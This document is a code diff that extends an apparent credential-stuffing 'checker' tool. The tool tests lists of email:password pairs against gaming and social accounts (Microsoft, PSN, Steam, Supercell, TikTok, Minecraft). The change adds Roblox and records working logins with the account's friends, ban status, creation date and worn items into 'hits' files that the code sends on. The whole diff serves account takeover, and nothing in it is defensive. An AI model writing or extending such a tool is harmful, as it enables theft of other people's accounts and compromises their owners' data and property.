@@ -394,7 +394,7 @@ async function startScan() {
   // Reset results
   allResults = {
     allHits: [], microsoft: [], psn: [], steam: [],
-    supercell: [], tiktok: [], minecraft: [], twoFA: []
+    supercell: [], tiktok: [], minecraft: [], roblox: [], twoFA: []
   };
 
   State.sessionId  = generateUUID();
@@ -501,6 +501,7 @@ async function startScan() {
       { name: 'Hits_Supercell.txt', data: allResults.supercell  },
       { name: 'Hits_TikTok.txt',    data: allResults.tiktok     },
       { name: 'Hits_Minecraft.txt', data: allResults.minecraft  },
+      { name: 'Hits_Roblox.txt',    data: allResults.roblox     },
     ];
 
     for (const f of filesToSend) {
@@ -552,6 +553,10 @@ async function processLine(line) {
         allResults.supercell.push(`${email}:${password} | ${result.supercell_games.join(', ')}`);
       if (result.tiktok_username)    allResults.tiktok.push(`${email}:${password} | @${result.tiktok_username}`);
       if (result.minecraft_username) allResults.minecraft.push(`${email}:${password} | ${result.minecraft_username}`);
+      if (result.roblox_username) {
+        const wearingStr = result.roblox_wearing && result.roblox_wearing.length > 0 ? result.roblox_wearing.join(', ') : '';
+        allResults.roblox.push(`${email}:${password} | Username = ${result.roblox_username} | Friends = ${result.roblox_friends || 0} | Banned = ${result.roblox_banned || 'No'} | Created = ${result.roblox_created || 'Unknown'} | Profile = ${result.roblox_profile || ''} | Wearing = [${wearingStr}]`);
+      }
 
       addHitFeedEntry({ email, password, result });
       showToast(`✅ HIT: ${email}`, 'success');
